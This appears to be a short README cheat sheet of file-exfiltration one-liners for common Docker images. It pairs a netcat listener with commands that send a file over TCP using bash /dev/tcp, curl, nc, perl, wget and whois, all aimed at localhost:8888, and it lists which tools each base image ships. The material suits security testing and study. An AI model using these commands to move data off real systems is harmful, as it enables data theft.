# Docker image-based file exfiltration

The following collection strives to offer accessible
methodologies for extracting files from widely
utilized Docker images.
It is important to note that these methods should
not be employed for any illicit or unauthorized purposes,
but rather for legitimate applications such as network
connectivity testing and related evaluations.

```bash
# start the container (with host network)
docker run -it --network="host" <image> sh

# start a nc tcp listener on the host
nc -nvlp 8888 > example
```

## Resources

- [0xffsec.com](https://0xffsec.com/handbook/exfiltration/)
- [Hacking Articles](https://www.hackingarticles.in/data-exfiltration-using-linux-binaries/)
- [GTFOBins](https://gtfobins.github.io)

## Exfiltrate possibilities

- bash
- curl
- nc / netcat
- perl
- wget
- whois

**bash**

```bash
bash -c 'echo -e "POST / HTTP/0.9\n\n$(<example.txt)" > /dev/tcp/localhost/8888'
```

**curl:**

```bash
curl -X POST -d @example.txt localhost:8888
```

**nc / netcat:**

```bash
# exfiltrate via tcp
nc localhost 8888 < example.txt
```

**perl**

```bash
perl -MIO::Socket::INET -e '$c=new IO::Socket::INET(PeerAddr,"localhost:8888");open(F,"example.txt");print $c $_ while(<F>);close(F);$c->close();'
```

**wget:**

```bash
wget --post-file=example.txt localhost:8888
```

**whois:**

```bash
whois -h localhost -p 8888 `cat example.txt`
```

## alpine

- nc
- wget
- whois

## debian & ubuntu

- bash
- perl

## centos

- bash
- curl
